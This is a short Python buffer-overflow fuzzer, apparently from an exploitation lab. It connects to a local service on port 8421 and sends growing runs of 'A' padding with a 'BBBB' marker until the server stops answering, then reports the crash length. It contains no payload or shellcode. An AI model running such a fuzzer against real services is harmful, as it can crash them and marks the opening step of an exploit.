import socket
import time

host = "127.0.0.1"
port = 8421

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((host, port))

msg = sock.recv(2048).decode()
print(msg)

msg = sock.recv(2048).decode()
print(msg)

for i in range(500, 600):
    badstr = "A" * i + "B" * 4 + "C" * 50
    print("Trying length " + str(i) + " (total: " + str(len(badstr)) + ")")
    
    try:
        sock.send(badstr.encode() + b"\n")
        
        sock.settimeout(2)
        try:
            msg = sock.recv(2048).decode()
            print("Response: " + msg[:100])
        except socket.timeout:
            print("No response - server may have crashed!")
            print("CRASH AT LENGTH: " + str(i))
            break
            
    except Exception as e:
        print("Error at length " + str(i) + ": " + str(e))
        break
    
    time.sleep(0.1)

sock.close()
print("Fuzzing complete")